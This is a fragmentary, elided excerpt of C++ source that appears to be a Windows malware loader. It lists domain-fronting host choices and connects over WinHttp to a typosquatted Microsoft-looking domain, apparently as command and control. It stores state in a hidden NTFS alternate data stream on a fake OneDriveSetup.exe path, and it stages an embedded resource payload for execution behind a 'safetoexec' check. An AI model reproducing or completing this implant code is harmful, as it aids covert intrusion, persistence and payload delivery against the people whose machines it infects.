...
//Cloudfronting Choices
//docs.google.com
//iatraining.disa.mil
//iatraining.disa.mil
//mscrl.miscrosoft.com 
//ctx.azureedge.net
...
bool uptime()
{
	...
	if (hSession)
		hConnect = WinHttpConnect(hSession, L"mscrl.miscrosoft.com",
	...
	if (!open)
	{
		...
		std::fstream file_in("C:\\ProgramData\\Microsoft OneDrive\\Packages\\%PROCESSOR_ARCHITECTURE%\\OneDriveSetup.exe:date", std::ios_base::binary | std::ios_base::in);
		...
		{
			file_in.close();
			std::fstream file_out("C:\\ProgramData\\Microsoft OneDrive\\Packages\\%PROCESSOR_ARCHITECTURE%\\OneDriveSetup.exe:date", std::ios_base::binary | std::ios_base::out);
	...
	{
		time_t Lastfailue;
		std::fstream file_out("C:\\ProgramData\\Microsoft OneDrive\\Packages\\%PROCESSOR_ARCHITECTURE%\\OneDriveSetup.exe:date", std::ios::binary | std::ios_base::out | std::ios_base::trunc);
		file_out.close();
		std::fstream file_in("C:\\ProgramData\\Microsoft OneDrive\\Packages\\%PROCESSOR_ARCHITECTURE%\\OneDriveSetup.exe:date", std::ios_base::binary | std::ios_base::in);
		if (file_in.peek() != std::ifstream::traits_type::eof())
		{
...
/*
BYTE *buffer_payload(HMODULE dll_handle, OUT size_t &r_size)
{
	...
	//Get the resource
	hRes = FindResource(dll_handle, MAKEINTRESOURCE(IDR_BIN), RT_RCDATA);
	if (hRes == nullptr) {
		return false;
	}
	...
	ImgResData = (BYTE *)LockResource(hResourceLoaded);
	if (hResourceLoaded == nullptr) {
		return false;
	}

	//r_size = 14336;
	r_size = SizeofResource(dll_handle, hRes);
	return NULL;
}
*/
...
void PrepPay()
{
	...
	if (!len)
	{
		...
		if (safetoexec && open)
		{
			//unsigned char* pyld = buffer_payload(hModule, OUT r_size);
			BOOL result = true;
			int valueLength = 512;
			TCHAR* envVarValue = new TCHAR[valueLength];
			DWORD len = NULL;
